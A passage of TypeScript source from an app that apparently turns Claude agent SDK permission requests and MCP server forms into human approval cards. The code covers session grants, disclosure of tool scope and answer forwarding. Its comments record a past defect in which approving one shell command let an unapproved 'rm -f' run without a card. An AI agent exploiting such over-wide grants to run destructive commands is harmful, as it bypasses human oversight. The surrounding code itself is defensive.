      const forward = answerToForward(questions, response.answers)
      if (!forward.forwardable) {
        return { behavior: 'deny', message: `answer cannot be forwarded (${forward.why})` }
      }
      // Official `AskUserQuestion` answer shape: { answers: { [questionText]: answer } }
      // for ALL questions (033) — never the invented `__brobot_answer` field.
      //
      // ⛔ **`Object.create(null)`, because the KEY is the model's own sentence** (146, from 145
      // HIGH 2). `question: string` is unrestricted in the pinned typings, so a question whose text
      // is `__proto__` is a legal call — and `plain['__proto__'] = answer` sets the object's
      // prototype instead of creating a property, so `JSON.stringify` would hand the SDK `{}` and
      // the model would see its own question unanswered while BroBot recorded `Answered`. On a
      // null-prototype object there is no `__proto__` setter to swallow it and it serialises like
      // any other key. Measured on the pinned versions, not assumed.
      const answers: Record<string, string> = Object.create(null)
      for (const q of questions)
        answers[q.prompt] = claudeAnswerText(forward.values.get(q.id) ?? [])
      // The `Other` answer, in the one slot the provider has for it (143).
      const response_ = claudeFreeformResponse(forward.typed)
      return {
        behavior: 'allow',
        updatedInput: {
          ...input,
          answers,
          ...(response_ === undefined ? {} : { response: response_ }),
        },
      }
    }
    // ExitPlanMode (and any non-question user-input tool): an answer approves it, and declining took
    // the safe-decline exit above. A plan is consent, not choice, so there is nothing to forward but
    // the approval. (`EnterPlanMode` never gets here since `736`, R98: it is allowed with no card.)
    return { behavior: 'allow' }
  }

  /**
   * 🔴 **728 · R93 — an MCP server's form reaches the person, as the Claude CLI hands it over.**
   *
   * ⛔ **Until `728` nothing answered this callback, and the SDK's own contract is that an unhandled
   * elicitation *"will be declined automatically"*** (`sdk.d.ts`, `Options.onElicitation`).
   * ⚑ **Measured** (`probe:tool-calls-as-the-cli`, bundled CLI, loopback): the CLI handed a server's
   * one-field form and its zero-field form to this callback; with none, the server got
   * `{"action":"decline"}` and no person saw anything.
   *
   * Map forms with fields to `user_input_request`; zero-field forms offer Allow (`accept` without content), Deny (`decline`) and Cancel (`cancel`, without stopping work). {@link codexElicitation} reads the same MCP fields. URL requests use the URL card with the server's `ElicitationRequest.url` and I opened it (`accept` without content); a withheld link offers no action claiming it was opened.
   */
  async handleElicitation(
    request: ElicitationRequest,
    signal: AbortSignal,
    requestId: string,
  ): Promise<ElicitationResult> {
    if (this.isShuttingDown) return { action: 'cancel' }
    const elicitation = codexElicitation({
      serverName: request.serverName,
      message: request.message,
      mode: request.mode ?? 'form',
      requestedSchema: request.requestedSchema,
      url: request.url,
    })
    // ⛔ No server name, no card — {@link codexElicitation}'s rule; nobody answered, so `cancel`.
    if (elicitation === null) return { action: 'cancel' }
    const id = `${ELICITATION_ID_PREFIX}${requestId}`
    const prompt = claudeElicitationPrompt(elicitation)
    // ⛔ **Whoever answered, and only they, decides between `decline` and `cancel`**: a slot settled
    // by a Stop, a close or an SDK abort is nobody's decision, which MCP spells `cancel`.
    const nobodyAnswered = (): boolean => !this.answeredByAPerson.delete(id)
    if (elicitation.mode === 'form' && elicitation.fields.length > 0) {
      const questions = elicitationQuestions(elicitation)
      const reservation = this.userInputs.reserve(id, signal)
      if (!reservation.accepted) return { action: 'cancel' }
      this.askedQuestions.set(id, questions)
      this.elicitationForms.set(id, elicitation)
      this.emit({
        type: 'user_input_request',
        id,
        prompt,
        questions,
        mcpServerAsks: serverAsks(elicitation),
      })
      this.machine.beginWait()
      const response = await reservation.response
      this.askedQuestions.delete(id)
      this.elicitationForms.delete(id)
      const settled = nobodyAnswered()
      if (this.isShuttingDown) {
        this.machine.abandonWait()
        return { action: 'cancel' }
      }
      this.machine.endWait()
      if (settled) return { action: 'cancel' }
      if (response.kind !== 'answer') return { action: 'decline' }
      const forward = answerToForward(questions, response.answers)
      if (!forward.forwardable) return { action: 'decline' }
      const built = elicitationContent(elicitation, forward.values)
      if ('refusal' in built) return { action: 'decline' }
      // ⚑ The server's own JSON types, which {@link elicitationContent} built from its schema.
      return { action: 'accept', content: built.content as ElicitationResult['content'] }
    }
    // ⚑ **W4.28 · a url request whose link the card shows has a way to allow: *I opened it*** —
    // the person's word that they opened the server's page, answered as MCP's `accept`. ⛔ Only a
    // person's press answers it: this card is answered through `respondPermission`, which only the
    // window's own door calls, and nothing in this app allows a server's card on its own.
    const showsALink = opensALink(elicitation)
    const offer = publishedOffer(elicitation.mode === 'form' || showsALink ? ['allow'] : [])
    const reservation = this.permissions.reserve(id, signal)
    if (!reservation.accepted) return { action: 'cancel' }
    this.offeredDecisions.set(id, new Set(offer))
    this.emit({
      type: 'permission_request',
      id,
      // ⚑ **`command`, because that is what a tool call already IS in this vocabulary** (`348`).
      kind: 'command',
      action: elicitation.serverName,
      ...boundPermissionDetail(prompt),
      // ⚑ The SERVER asks, not the agent — see {@link RuntimeEvent} `mcpServerAsks`.
      mcpServerAsks: serverAsks(elicitation),
      // ⚑ R81 — its Cancel asks nothing to stop (below), and the card carries that.
      cancelStopsNothing: true,
      scope: {
        paths: [],
        networkHosts: [],
        persistence: persistenceOf(offer),
        amendments: [],
        availableDecisions: offer,
        ...(elicitation.mode === 'form' || showsALink
          ? {}
          : { noPositiveBecause: 'could-not-represent-the-answers' as const }),
        // ⚠️ The request names the server and not the call, so the effect is not representable.
        underDisclosed: true,
        approvalMode: isAutoApprove({ approvalMode: this.approvals.effective }) ? 'auto' : 'ask',
      },
    })
    this.machine.beginWait()
    const decision = await reservation.response
    this.offeredDecisions.delete(id)
    const settled = nobodyAnswered()
    if (this.isShuttingDown) {
      this.machine.abandonWait()
      return { action: 'cancel' }
    }
    this.machine.endWait()
    if (settled) return { action: 'cancel' }
    // ⚑ A url request's `accept` carries no content (MCP's url mode: the person went to the page).
    if (decision.outcome === 'allow') {
      return showsALink ? { action: 'accept' } : { action: 'accept', content: {} }
    }
    if (decision.outcome !== 'cancel') return { action: 'decline' }
    // ⛔ **728 review · Cancel asks NOTHING to stop, and the card says so** (`cancelStopsNothing`).
    // The SDK's request names the server and nothing else — no call, no agent, no turn — so the work
    // that raised it cannot be told from the turn that happens to be open: a background agent's form
    // answered during the person's next turn would have stopped THAT turn. `cancel` goes to the
    // server, which is MCP's *"dismissed without making an explicit choice"*, and nothing more.
    return { action: 'cancel' }
  }
}

/** ⚑ 728 · the id a server-form card carries, so the two answer doors can tell it from a tool card. */
const ELICITATION_ID_PREFIX = 'elicitation-'

/**
 * ⚑ **728 · what a Claude server-form card says about WHO is asking** — {@link
 * externalMcpElicitationPrompt}'s admission, for the provider it is true of here: the SDK's request
 * names the server and not the call. The admission first, the server's own words after it, marked as
 * the server's; no empty quotation when the server sent none.
 */
function claudeElicitationPrompt(elicitation: CodexElicitation): string {
  const saying =
    `${elicitation.serverName} is asking you something. Claude names the server and not the ` +
    `call, so BroCrew cannot tell you which of this server\u2019s tools you are answering for.`
  return `${saying}${elicitationWords(elicitation)}`
}

/**
 * Flatten the approved values of one question to the single string `AskUserQuestion` expects.
 *
 * ⛔ **Comma-separated is documented; the SPACE is ours** (142 §5, correcting what 139 committed
 * here). The pinned SDK's `AskUserQuestionOutput.answers` says exactly this and no more: *"The
 * answers provided by the user (question text -> answer string; **multi-select answers are
 * comma-separated**)"* — read at `sdk-tools.d.ts:3553-3555` of 0.3.218. It does not say comma versus
 * comma-space, it gives no quoting or escaping rule, and it says nothing about a label that itself
 * contains a comma. So `', '` is this adapter's readable choice inside a documented shape, and 139's
 * claim that the separator itself was documented was false. The distinction is not pedantry: a
 * separator we chose is one we may have to change, and one the provider documented is not.
 *
 * ⛔ **The ambiguity it leaves is real and structural.** An adopted session in our own corpus
 * (`sess_865688c3…`, raw frames 60/61) carries a legitimate SINGLE answer whose option label
 * contains a comma and a space. On the wire that is indistinguishable from two labels joined here.
 * Which is why {@link answerToForward} refuses several answers to a question that declared one:
 * this join is only ever reached for a question that asked for several, where the provider's own
 * format is the one being spoken.
 *
 * ⚠️ **Takes the APPROVED values, never the raw answer** (142 §3). Passing the original array is the
 * defect 141 found: the guard counted the filtered list and this joined the unfiltered one, so
 * `["the root", "   "]` went out as `"the root,    "`.
 */
function claudeAnswerText(values: readonly string[]): string {
  return values.join(', ')
}

/**
 * The pinned `AskUserQuestionInput.response`, or nothing at all (143).
 *
 * ⚑ **The field exists and is exactly this:** *"Freeform text the user typed instead of selecting a
 * structured option"* — optional, top-level, and a plain string. It is the only place on Claude's
 * shape where an `Other` answer can be told apart from a chosen label, since the per-question
 * `answers` map is `question text → string` and a typed answer occupies a label's slot in it.
 *
 * ⛔ **Filled only when ONE question was answered freeform, and that is a limit of the field rather
 * than a rule invented here.** `response` is singular while a call carries 1–4 questions, and the
 * pinned typings say nothing about which question a freeform response belongs to or how several
 * would be expressed. Joining two would build a format no provider documents — the same mistake
 * 142 §5 caught in the opposite direction, where a separator we chose had been recorded as one the
 * SDK specified. So several typed answers travel in `answers` alone, where each is already against
 * its own question and nothing is ambiguous, and `response` stays absent rather than approximate.
 *
 * ⚠️ **`answers` carries it either way.** This is an ADDITIONAL signal, never the carrier: dropping
 * the text from `answers` and putting it only here would leave the question unanswered on the shape
 * the model actually reads.
 */
function claudeFreeformResponse(typed: ReadonlyMap<string, readonly string[]>): string | undefined {
  if (typed.size !== 1) return undefined
  const [only] = [...typed.values()]
  return only?.length === 1 ? only[0] : undefined
}

/**
 * Claude answers any of our decisions (session maps to allow, cancel to deny+interrupt).
 *
 * This is the ADAPTER's ceiling — what `respondPermission` will honour at all — and never what a
 * given card offered. {@link claudeDecisionsFor} narrows it per request, and the per-request
 * `offeredDecisions` set is what actually gates an answer, so widening this list does not by itself
 * put a button anywhere.
 */
const CLAUDE_AVAILABLE_DECISIONS: readonly PermissionOutcome[] = [
  'allow',
  'allow_for_session',
  'allow_all_for_session',
  'allow_always',
  'deny',
  'cancel',
]

function hostOf(url: string): string | undefined {
  try {
    return new URL(url).host || undefined
  } catch {
    return undefined
  }
}

/**
 * Map a `canUseTool` input into the same provider-neutral {@link PermissionScope}
 * as Codex (014, fixing 007 P1-7) — so the approval event is genuinely neutral,
 * not Codex-only.
 *
 * `persistence` says what accepting this card WOULD do, and since 031 that is a real choice rather
 * than a formality: Claude does have a session scope, `allow_for_session` installs session rules
 * through it, and the card offers that outcome. It was hardcoded `'once'` on the belief — written
 * down in `permission.ts` — that no such scope existed. Leaving it at `'once'` now would disclose
 * LESS than the button actually grants, which is the same class of defect as 007 P1-7 pointing the
 * other way, so the two moved in one commit.
 *
 * `grantRoot` stays absent deliberately: a Claude grant is the CLI's own RULE — its `grants` say
 * which ({@link claudeGrantsOf}, `736` R94) — never a filesystem root, and naming one would
 * describe a grant nobody made.
 */
function claudeScope(
  cwd: string,
  toolName: string,
  input: Record<string, unknown>,
  grantsWithheld = false,
  /** 🔴 736/740 · the CLI's own CHOICE for this ask ({@link cliRowOf}) — what its buttons install. */
  suggestions: readonly PermissionUpdate[] = [],
  /** 🔴 736/740 · the file an `allow_always` is kept in: the project's local settings (R99). */
  alwaysFile?: string,
): PermissionScope {
  const uniquePaths = disclosedPaths(input)
  const networkHosts: string[] = []
  const url = input['url']
  if (typeof url === 'string') {
    const host = hostOf(url)
    if (host) networkHosts.push(host)
  }
  // Conservative disclosure (023 P1-F): only a structured FILE tool — whose file path
  // fully captures its effect — may claim full disclosure. Bash (and any other tool)
  // carries an opaque command/args we do NOT structurally decompose, so its real
  // paths/network/redirection are unknown here and it must be marked under-disclosed
  // rather than falsely "fully disclosed with no scope".
  //
  // ⚠️ **`Read`/`NotebookRead` joined the FILE tools for this test in 071, and nothing else moved.**
  // Until then neither could reach a card at all, so the question never came up; now an out-of-cwd
  // read raises one, and `underDisclosed: true` would be false about it — a `file_path` is the whole
  // of what a read does. Getting that wrong is not cosmetic: an under-disclosed card offers the WIDE
  // session grant (`allow_all_for_session`) instead of the narrow one, so every out-of-cwd read
  // would have offered "every Read this session, whatever the path" as its only relief. `Glob` and
  // `Grep` deliberately stay out — their `path` bounds a PATTERN, and a pattern is not a disclosure.
  const fullyDisclosed = PATH_COMPLETE_TOOLS.has(toolName) && uniquePaths.length > 0
  const decisions = claudeDecisionsFor(fullyDisclosed, grantsWithheld, toolName, suggestions)
  const grants = claudeGrantsOf(decisions, toolName, suggestions, alwaysFile)
  return {
    // A shell keeps a `cd` between calls, and the CLI does not say where it stands now, so a shell
    // card names no folder rather than one its command may not run in.
    cwd: SHELL_TOOLS.has(toolName) ? undefined : cwd,
    paths: uniquePaths,
    networkHosts,
    // Follows the offered set, so the card can never promise a persistence it does not offer (031)
    // — and, since 058, can never offer one it does not admit to either. Both session grants are
    // read, because an under-disclosed card now offers the WIDER of the two: reading only the
    // narrow one would have left every Bash card saying `persistence: once` beside a button that
    // grants the whole tool for the session, which is the same class of lie in the other direction.
    persistence: persistenceOf(decisions),
    ...(grants === null ? {} : { grants }),
    amendments: [],
    // ⚑ **Through {@link publishedOffer} since 487, and the value does not move.** This adapter
    // has always kept both refusals — {@link claudeDecisionsFor} filters only the two session
    // grants — so the floor is stated here the way every other producer states it rather than
    // being a property of one filter nobody was asked to preserve.
    availableDecisions: publishedOffer(decisions),
    // ⚑ A shell call whose card shows its whole command hides nothing of what it asks: the command
    // is what runs, and no list of its files or hosts, and no folder, is drawn to be read as
    // complete. Its effects are still not decomposed, which is why the offer above treats it as
    // opaque.
    underDisclosed: !fullyDisclosed && !theCommandIsTheWholeCall(toolName, input),
  }
}

/** The fields of a shell call that change nothing about what it runs: its words and its timing. */
const A_SHELL_CALLS_SHOWN_FIELDS: ReadonlySet<string> = new Set([
  'command',
  'description',
  'timeout',
  'run_in_background',
])

/**
 * Whether a shell call's command, which its card shows, is the whole of what it asks. A field beyond
 * its words and timing (the CLI's `dangerouslyDisableSandbox`, or one it adds later) is not shown,
 * so such a call stays under-disclosed.
 */
function theCommandIsTheWholeCall(toolName: string, input: Record<string, unknown>): boolean {
  return (
    SHELL_TOOLS.has(toolName) &&
    typeof input['command'] === 'string' &&
    Object.keys(input).every((key) => A_SHELL_CALLS_SHOWN_FIELDS.has(key))
  )
}

/**
 * Which decisions a card may offer — and specifically, whether "Allow for this conversation" is one
 * of them (031).
 *
 * **A session grant was per TOOL, because that was the only thing the guard hook could match on**
 * (⚑ since `736`, R94, the narrow one is the CLI's own suggestion for the ask, {@link sessionGrantOf}),
 * and a per-tool grant is more than an opaque tool's card ever disclosed. Measured live before this rule existed:
 * approving `Bash — echo ALPHA` for the session let `rm -f …` run afterwards with **no card at
 * all**. The user approved one command and was charged for the whole shell.
 *
 * So until `736` the offer followed the SAME disclosure test the scope already computes (since R94
 * it follows the CLI's own suggestions — below). A structured file tool
 * states its effect completely — the card names the tool and a real path, and granting that tool for
 * the session is a thing a user can actually weigh. An UNDER-DISCLOSED tool (Bash and anything else
 * whose args we deliberately do not decompose) cannot describe what a session grant would cover, so
 * it is not offered one: it asks every time, which for an opaque tool is the right answer rather
 * than a limitation.
 *
 * The alternative — offering it everywhere and quietly granting the tool — is exactly the 007 P1-7
 * defect this codebase already fixed once in the other direction.
 *
 * 🔴 **736 · R94/R95 — the CLI's own suggestions ARE the standing grants.** While our own hook forced
 * the ask, `suggestions` arrived null; with the CLI asking for itself they arrive (measured:
 * `setMode acceptEdits` for a `Write`, `Read(//<folder>/**)` for a read outside it, a
 * `localSettings` rule for `rm` or an MCP tool). `728` echoed none of them (its F-2); `736` offers
 * them as the CLI does — the conversation grant is the set held to `session`, and where the CLI would
 * keep a rule in a settings file, `allow_always` keeps it. 🔴 **740 · R99** — both out of the
 * INTERACTIVE CLI's own choice ({@link cliRowOf}: an `rm`'s is its folder), and the kept one where
 * the CLI keeps it, the project's local settings (`736` kept it in the provider home's).
 *
 * ## What 058 changed, and what it deliberately did not
 *
 * Until `736` everything above held: an under-disclosed tool was never offered `allow_for_session`,
 * because that grant's meaning was "the tool, on what the card showed" and such a card showed
 * nothing to scope to. 058 did not widen it, soften it, or make an exception to it. ⚑ Since R94 that
 * grant is the CLI's own suggestion, offered wherever the CLI offered one, disclosed or not.
 *
 * What it added is the OTHER grant — `allow_all_for_session`, "this tool, wholesale" — offered in
 * exactly the place the narrow one is refused. That placement is load-bearing twice over. It is the
 * only honest home for a wide grant, because a card that cannot describe a scope cannot pretend to
 * grant one; and because the two were complementary rather than overlapping, no card offered both.
 * ⚠️ **Since `736` (R94) one can**: an under-disclosed card whose CLI offered its own rule (`make
 * build`'s, say — ⚑ `740`: never an `rm`'s, whose own choice is its folder),
 * say) carries the CLI's rule as `allow_for_session` AND this app's whole-tool grant — two distinct
 * buttons, each with its own `grants`, so 058's *"must not be reachable by the same click"* still
 * holds; what is gone is only *"never both on one card"*. Where the CLI's rule already IS the whole
 * tool (an MCP tool's), the second is not drawn.
 *
 * The cost is real and is the reason it took a dispatch to add: the measurement three paragraphs up
 * — approve `echo ALPHA`, and `rm -f …` runs uncarded — is precisely what this grant does. The
 * difference between that defect and this feature is entirely that the user asked for it, in words
 * that said what it was. So the button's label is not decoration; it is the safety property.
 */
function claudeDecisionsFor(
  fullyDisclosed: boolean,
  grantsWithheld = false,
  toolName = '',
  suggestions: readonly PermissionUpdate[] = [],
): readonly PermissionOutcome[] {
  // 🔴 **695 · R36a — a marked ask offers NEITHER session grant.** The provider said the rule
  // *"don't ask again"* would grant more than this ask's own action. ⚑ Measured on 695 for the
  // whole-tool rule this adapter then installed (the CLI strips a whole-tool allow rule from an ask
  // it marked). ⚠️ Since `736` (R94) the narrow grant is the CLI's own suggestion
  // ({@link sessionGrantOf}), and `allow_always` is withheld with both — the refusal stands on the
  // provider's own word, which is enough: a marked ask offers no don't-ask-again in the CLI either.
  // With both gone, `persistence` follows to `once` and `respondPermission`'s gate refuses a session
  // answer to this card by construction. ⚑ `728`: also withheld while the conversation is planning
  // (see the caller).
  if (grantsWithheld) {
    return CLAUDE_AVAILABLE_DECISIONS.filter(
      (outcome) =>
        outcome !== 'allow_for_session' &&
        outcome !== 'allow_all_for_session' &&
        outcome !== 'allow_always',
    )
  }
  // 🔴 **736 · R94 — the conversation grant is the CLI's own rule**: offered exactly where the CLI
  // offered its own "don't ask again" (its `suggestions`), and it installs those. ⚑ **R95 — and
  // where that rule is one the CLI keeps in a settings FILE, the same choice with the persistence
  // the CLI gives it** (`allow_always`). ⚠️ `allow_all_for_session` — this app's whole-tool grant
  // (058), which the CLI does not offer — stays where 058 put it, and is not drawn a second time
  // where the CLI's own conversation rule already IS the whole tool (an MCP tool's).
  const cli = sessionGrantOf(suggestions)
  return CLAUDE_AVAILABLE_DECISIONS.filter((outcome) =>
    outcome === 'allow_for_session'
      ? cli.length > 0
      : outcome === 'allow_always'
        ? suggestions.some(keptByTheCli)
        : outcome === 'allow_all_for_session'
          ? !fullyDisclosed && !isTheWholeTool(cli, toolName)
          : true,
  )
}

/**
 * 🔴 **740 · R99 — the one destination the CLI's own choices KEEP: `localSettings`**, the project's
 * `<root>/.claude/settings.local.json` ({@link projectLocalSettingsFile}), as opposed to `session`.
 * ⚑ The interactive CLI's rows offer these two and no other (measured: `make build`, a WebFetch
 * host and an MCP tool each kept in the project's file). ⛔ Until `740` (`736`, R95) a file-bound
 * suggestion was rewritten to `userSettings` — the provider home — which reached every folder the
 * identity works in (`736` F-4).
 */
const KEPT_DESTINATION: PermissionUpdateDestination = 'localSettings'

/** The destinations the CLI's own choices ever offer — {@link KEPT_DESTINATION} and the session. */
const OFFERED_DESTINATIONS: ReadonlySet<PermissionUpdateDestination> = new Set([
  KEPT_DESTINATION,
  'session',
])

function keptByTheCli(update: PermissionUpdate): boolean {
  return update.destination === KEPT_DESTINATION
}

/** The shell tools whose own row the CLI builds from rules and folders only. */
const SHELL_TOOLS = new Set(['Bash', 'PowerShell'])

/** The CLI's `suggestions` for an ask, as this adapter reads them: an array, or nothing. */
function suggestionsOf(options: ToolPermissionOptions): PermissionUpdate[] {
  return Array.isArray(options.suggestions) ? options.suggestions : []
}

/**
 * 🔴 **740 · R99 (`736` F-9) — the choice the INTERACTIVE CLI offers for this ask, out of what the SDK
 * suggests.** ⚑ *"Where the CLI and BroBot differ, BroBot does what the interactive CLI does."* The SDK
 * hands its host the whole suggestion set (its own doc: return *"this full set"*); the interactive CLI
 * shows a person one row built from it, and that row is what both standing buttons install
 * ({@link sessionGrantOf}, {@link alwaysGrantOf}).
 *
 * ⚑ **What the interactive CLI offers, as its runs outside `/tmp` showed it:**
 * - **every row** offers only `localSettings` and `session` updates ({@link OFFERED_DESTINATIONS});
 * - **a shell row** (Bash) carries only rules and folders — never a mode: *accept edits* is a file
 *   tool's choice, not a command's;
 * - **a shell ask whose path check named a file** — the SDK's `blockedPath`, on an `rm` or a `touch`
 *   in the folder — offers no rule for the COMMAND: for an `rm` only its folder, *"Yes, and always
 *   allow access to <folder> from this project"*, which adds it for the session, writes no file, and
 *   asks the same `rm` again in the session and at the next launch (K1, K2 — git or not). ⚠️ The SDK
 *   suggests that command's own rule there as well (`probe:tool-calls-as-the-cli` `bash-rm`,
 *   `bash-touch`), and the interactive CLI never offers it: the SDK's `blockedPath` is the only thing
 *   that tells the two apart on this side of the SDK, and `make build` — whose rule the CLI does
 *   offer — carries none (measured). A `Read` rule on such an ask stays: the CLI's shell row shows
 *   *"allow reading from <folder>"* (not measured on a shell read here).
 *
 * ⛔ **On `main` (`736`)** the whole set was installed: for an `rm`, the command's rule, the folder and
 * *accept edits*, and an *always* that kept the rule — wider than any choice the CLI offers there.
 */
function cliRowOf(
  toolName: string,
  options: ToolPermissionOptions,
  worksIn: readonly string[],
): PermissionUpdate[] {
  const offered = suggestionsOf(options)
    .flatMap(addsAFolder(worksIn))
    .filter(
      (update) =>
        OFFERED_DESTINATIONS.has(update.destination) &&
        // ⚑ `740`'s review: no row of the CLI's carries a rule change that is not an ALLOW.
        !(
          (update.type === 'addRules' ||
            update.type === 'replaceRules' ||
            update.type === 'removeRules') &&
          update.behavior !== 'allow'
        ),
    )
  if (!SHELL_TOOLS.has(toolName)) return offered
  const namedAFile = options.blockedPath !== undefined
  return offered.flatMap((update): PermissionUpdate[] => {
    if (update.type === 'addDirectories') return [update]
    if (update.type !== 'addRules' || update.behavior !== 'allow') return []
    // ⚑ The shell's OWN rule is dropped from an ask that named a file; a `Read` rule is not — the
    // CLI's shell row shows *"allow reading from <folder>"*.
    const rules = namedAFile
      ? update.rules.filter((rule) => rule.toolName !== toolName)
      : update.rules
    if (rules.length === 0) return []
    if (update.destination !== KEPT_DESTINATION) return [{ ...update, rules }]
    // ⚑ A rule naming one whole command matches that command and nothing else, so keeping it would
    // ask again for every other command: it holds for this conversation only, and only a rule that
    // covers the program with other arguments is kept.
    const once = rules.filter((rule) => rule.toolName === toolName && namesOneCommand(rule))
    const kept = rules.filter((rule) => !once.includes(rule))
    return [
      ...(kept.length === 0 ? [] : [{ ...update, rules: kept }]),
      ...(once.length === 0 ? [] : [{ ...update, rules: once, destination: 'session' as const }]),
    ]
  })
}

/**
 * A suggestion as it is offered: one that adds folders keeps only those outside the folders the
 * conversation works in, and is not offered when none is. Adding a folder it works in, or one
 * inside it, grants nothing: the same request is asked again (measured, for an `rm` in the
 * conversation's own folder).
 *
 * Folders are compared as the disk has them: a command names a folder as it was typed (`/tmp`),
 * and a reopened conversation holds its own as the CLI resolved it (`/private/tmp`). A folder the
 * disk cannot resolve, such as a link that leads nowhere, is never said to be worked in: its offer
 * stays.
 */
function addsAFolder(worksIn: readonly string[]): (update: PermissionUpdate) => PermissionUpdate[] {
  const held = worksIn.flatMap((folder) => realResolve(folder) ?? [])
  return (update) => {
    if (update.type !== 'addDirectories') return [update]
    const directories = update.directories.filter((path) => {
      const real = realResolve(path)
      return real === null || !held.some((folder) => isWithin(folder, real))
    })
    return directories.length === 0 ? [] : [{ ...update, directories }]
  }
}

/**
 * Whether a shell rule names one whole command. Only content ending in ` *` or `:*` (`make build *`,
 * `npm run test:*`) covers the command with other arguments; a `*` inside a command
 * (`python3 -c 'print(6*7)'`) is part of that one command.
 */
function namesOneCommand(rule: { readonly ruleContent?: string }): boolean {
  return rule.ruleContent !== undefined && !/(?: |:)\*$/.test(rule.ruleContent)
}

/**
 * 🔴 **736 · R94 — what "allow for this conversation" installs: the CLI's OWN choice, held to
 * `session`.** ⛔ Until `736` this was a rule of this app's own for exactly the files the card named
 * (`728`'s `Edit(//file)`), narrower than the CLI's — R94: *"never a narrower one of BroBot's own"*.
 * 🔴 **740 · R99 (`736` F-9) — and never WIDER than the interactive CLI's**: the row it installs is
 * {@link cliRowOf}'s, not the SDK's whole set.
 *
 * ⚑ **Measured** (`736`'s loopback, echoing each suggestion back as the host): a Read outside the
 * folder suggests `Read(//<its folder>/**)` — a second file in that folder then ran unasked and a
 * file in another folder was asked; a Write suggests `setMode acceptEdits` — the next edit in the
 * folder ran unasked and one outside it was asked. ⚠️ **Why every destination is held to `session`
 * here**: a CONVERSATION grant keeps nothing — the file-keeping half is `allow_always`'s
 * ({@link alwaysGrantOf}).
 */
function sessionGrantOf(row: readonly PermissionUpdate[]): PermissionUpdate[] {
  return row.map((update) => ({ ...update, destination: 'session' }))
}

/**
 * 🔴 **736 · R95 / 740 · R99 — what "always allow" installs: the CLI's own choice, with the
 * persistence the CLI gives it, KEPT WHERE THE CLI KEEPS IT.**
 *
 * ⚑ R99 (`736` F-4): *"an always rule is kept where the CLI keeps it"* — so a kept update goes to the
 * CLI at its OWN destination, `localSettings`, which the CLI writes to the project's
 * `.claude/settings.local.json` ({@link projectLocalSettingsFile}; measured). ⛔ Until `740` it was
 * rewritten to `userSettings`, the provider home, which reached every folder the identity works in.
 * ⚠️ **And the same rule again at `session`**: with `settingSources: []` the CLI does not apply a rule
 * it wrote to a file, not even for the rest of the running session (measured — the same command was
 * asked again), so without it "always" would ask again in the very conversation it was pressed in.
 * The next launch reads the file back ({@link keptRulesForALaunch}, as flag settings).
 */
function alwaysGrantOf(row: readonly PermissionUpdate[]): PermissionUpdate[] {
  return row.flatMap((update): PermissionUpdate[] =>
    keptByTheCli(update) ? [update, { ...update, destination: 'session' }] : [update],
  )
}

/** The tools a set of updates allows WHOLE — an allow rule naming the tool and no content. */
function wholeToolsOf(updates: readonly PermissionUpdate[]): string[] {
  return updates.flatMap((update) =>
    update.type === 'addRules' && update.behavior === 'allow'
      ? update.rules.filter((rule) => rule.ruleContent === undefined).map((rule) => rule.toolName)
      : [],
  )
}

/** Whether a conversation grant is already the whole of `toolName` — a rule for it with no content. */
function isTheWholeTool(updates: readonly PermissionUpdate[], toolName: string): boolean {
  return updates.some(
    (update) =>
      update.type === 'addRules' &&
      update.behavior === 'allow' &&
      update.rules.some((rule) => rule.toolName === toolName && rule.ruleContent === undefined),
  )
}

/** One CLI permission update as the card's {@link GrantRule}s — what the button installs. */
function grantRulesOf(updates: readonly PermissionUpdate[]): GrantRule[] {
  return updates.flatMap((update): GrantRule[] => {
    if (update.type === 'addRules' && update.behavior === 'allow') {
      return update.rules.map((rule) => ({
        kind: 'tool',
        tool: rule.toolName,
        ...(rule.ruleContent === undefined ? {} : { content: rule.ruleContent }),
      }))
    }
    if (update.type === 'setMode') return [{ kind: 'mode', mode: update.mode }]
    if (update.type === 'addDirectories') {
      return update.directories.map((path) => ({ kind: 'directory', path }))
    }
    return []
  })
}

/**
 * 🔴 **736 · R94 — what each standing button on this card installs**, so the card's words can say
 * what the rule covers. `null` when the card offers none.
 */
function claudeGrantsOf(
  decisions: readonly PermissionOutcome[],
  toolName: string,
  suggestions: readonly PermissionUpdate[],
  alwaysFile: string | undefined,
): PermissionGrants | null {
  const grants: PermissionGrants = {}
  if (decisions.includes('allow_for_session')) {
    grants.allow_for_session = grantRulesOf(sessionGrantOf(suggestions))
  }
  if (decisions.includes('allow_all_for_session')) {
    grants.allow_all_for_session = [{ kind: 'tool', tool: toolName }]
  }
  if (decisions.includes('allow_always')) {
    grants.allow_always = grantRulesOf(suggestions.filter(keptByTheCli))
    if (alwaysFile !== undefined) grants.alwaysFile = alwaysFile
  }
  return Object.keys(grants).length === 0 ? null : grants
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null
}

/**
 * The markdown plan an `ExitPlanMode` proposes, or `''` when there is none to show (030).
 *
 * Gated on the tool name as well as the field: `plan` reaches us through an index signature, so any
 * user-input tool could carry a key of that name, and only this one means a plan document by it.
 *
 * ⚠️ **`plan` IS STILL THE PLAN, AND THAT IS A MEASUREMENT, NOT AN ASSUMPTION (056).** 055 ran three
 * live plan-mode turns, saw no `ExitPlanMode` in any of them, and concluded this function was dead
 * against the current binary. It is not. Every `ExitPlanMode` ever recorded on this machine — eight
 * of them, across the app's own ledger and the CLI's transcripts, the newest 2026-08-04 — carries a
 * non-empty `input.plan`, and three of those are `plan_update` rows WITH a body in our own database
 * (`sess_423479cd…` ord 88, `sess_0c003cfa…`, `sess_408949ef…`, all 2026-08-03). What 055 actually
 * measured is that a cheap model in one turn does not REACH the tool — a fact about turns, not
 * about vocabulary. The lesson is the same one either way: check the wire, not the shape of the
 * absence.
 *
 * **The plan now also lives in a FILE, and we deliberately do not read it.** The modern input is
 * `{plan, planFilePath}` (and `allowedPrompts` when the model offers pre-approvals);
 * `planFilePath` names a file under the session's plans directory, and the tool's own description
 * tells the MODEL that ExitPlanMode "does NOT take the plan content as a parameter — it will read
 * the plan from the file you wrote". The CLI sends both anyway. We read the one that arrives on the
 * wire and never open the path: a document assembled from a provider-named file the user never saw
 * written is the fabrication 056 forbids, and `plan` has been present every single time. If it ever
 * stops being present, {@link userInputPrompt} says so out loud instead of showing a blank card —
 * that, not a disk read, is the honest failure.
 *
 * **`EnterPlanMode` cannot be a second source here.** Its declared input is `{}`
 * (sdk-tools.d.ts:2767) — there is no field a plan could arrive in, so widening this gate to accept
 * it would invent a document rather than find one.
 */
function planDocument(toolName: string, input: Record<string, unknown>): string {
  if (toolName !== 'ExitPlanMode') return ''
  const plan = input['plan']
